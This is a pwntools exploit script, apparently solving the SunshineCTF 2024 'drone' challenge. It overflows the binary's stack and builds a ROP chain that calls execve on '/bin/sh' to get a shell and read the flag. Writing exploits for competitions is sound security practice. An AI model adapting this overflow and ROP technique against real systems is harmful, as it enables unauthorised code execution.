from pwn import *

binary = args.BIN or "../attachments/drone.bin"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = """
continue
"""


if args.REMOTE:
    TIMEOUT = 0.5
else:
    TIMEOUT = 0.1

def get_remote():
    if args.GDB:
        # return gdb.debug(e.path, gdbscript=gs)
        return e.debug(gdbscript=gs)
    elif args.REMOTE:
        HOST = args.HOST or "2024.sunshinectf.games"
        PORT = int(args.PORT or 24004)
        return remote(HOST, PORT)
    else:
        return process(e.path)

def start():
    p = get_remote()
    s = p.recvn(10, timeout=TIMEOUT)
    if s != b'Password: ':
        p.unrecv(s)
        return p
    p.sendline(b'block the haters')
    return p


def unsafe():
    p.recvuntil(b">>>")
    p.sendline(b"SAFE")
    p.recvuntil(b">>>")
    p.sendline(b"N")


def setup_overflow():
    unsafe()
    p.recvuntil(b">>>")
    p.sendline(b"BRKS")
    p.recvuntil(b">>>")
    chain = cyclic(40)
    chain += p64(e.sym["deprecated_feedback"])
    p.sendline(chain)


def syscall_chain():
    pop_rdx_rcx = r.find_gadget(["pop rax", "pop rdx", "pop rcx", "ret"])[0]
    pop_rdi_rsi = r.find_gadget(["pop rdi", "pop rsi", "syscall"])[0]
    sh = next(e.search(b"/bin/sh\0"))
    log.info(f"Pop rax, rdx, rcx, retgadget: {hex(pop_rdx_rcx)}")
    log.info(f"Pop rdi, rsi, syscall gadget: {hex(pop_rdi_rsi)}")
    log.info(f"sh: {hex(sh)}")

    chain = cyclic(264)
    chain += p64(pop_rdx_rcx)
    chain += p64(0x3B)  # rax = 0x3b
    chain += p64(0x0)  # rcx = 0
    chain += p64(0x0)  # rdx = 0
    chain += p64(pop_rdi_rsi)
    chain += p64(sh)  # rdi = sh
    chain += p64(0x0)

    p.recvuntil(b">>>")
    p.sendline(chain)


p = start()

setup_overflow()
syscall_chain()

pause(1)
p.sendline(b'cat flag.txt')

p.interactive()
